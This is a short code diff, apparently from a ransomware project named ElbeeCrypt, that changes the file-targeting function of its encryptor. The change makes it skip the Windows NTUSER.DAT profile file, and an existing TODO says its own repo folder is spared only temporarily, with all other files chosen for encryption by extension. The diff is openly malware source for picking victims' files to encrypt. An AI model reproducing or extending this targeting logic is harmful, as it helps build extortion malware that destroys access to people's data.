@@ -18,7 +18,11 @@ namespace elbeecrypt::cryptor {
 	//Overrides
 	/** Impl of isTargetable(path). */
 	bool HunterEncryptor::isTargetable(const fs::path& path){
+		//Unbreaks for specific files and directories
+		if(path.filename().string() == "NTUSER.DAT") return false; //Do not target this file!
 		if(path.string().find("ElbeeCrypt") != std::string::npos) return false; //TODO: Don't encrypt files in the repo folder (remove this line later)
+
+		//If the file is targetable, encrypt it
 		return elbeecrypt::common::targets::Extensions::isEncryptable(path);
 	}
 
